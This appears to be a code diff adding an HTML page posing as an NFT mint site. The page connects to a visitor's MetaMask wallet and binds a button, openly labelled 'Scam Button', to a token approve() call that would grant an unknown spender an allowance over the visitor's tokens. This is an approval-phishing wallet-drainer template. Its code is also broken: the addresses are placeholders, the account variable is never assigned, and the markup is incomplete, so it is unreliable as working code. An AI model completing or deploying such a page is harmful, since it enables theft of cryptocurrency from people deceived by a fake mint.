@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Mint an NFT</title>
+        <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    </head>
+    <div>
+        <p>Wallet address: <span id="wallet-address"></span></p>
+        <button id="scam">Scam Button</button>
+    </div>
+
+    <script type="text/javascript">
+        // 1. Connect metamask to our site. Get the user's address
+        var account = null;
+        var contract = null;
+        const ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {
+                        "name": "_spender",
+                        "type": "address",
+                    },
+                    {
+                        "name": "_value",
+                        "type": "uint256",
+                    }
+                ],
+                "name": "approve",
+                "outputs": [
+                    {
+                        "name": "",
+                        "type": "bool",
+                    }
+                ],
+                "payable":false,
+                "": "",
+                "type": "function"
+            }
+        ];
+        const ADDRESS = "0x...";
+
+        (async () => {
+            if(window.ethereum) {
+                await window.ethereum.send('eth_requestAccounts');
+                window.web3 = new Web3(window.ethereum);
+                
+                var accounts = await web3.eth.getAccounts();
+                accounts = accounts[0];
+                document.getElementById('wallet-address').textContent = account;
+                
+                contract = new web3.eth.Contract(ABI, ADDRESS);
+                
+                document.getElementById('scam').onclick = () => {
+                    contract.methods.approve('', 100).send({from: account})
+                }
+            }
+        })();
+    </script>
+    </body>
+</html>
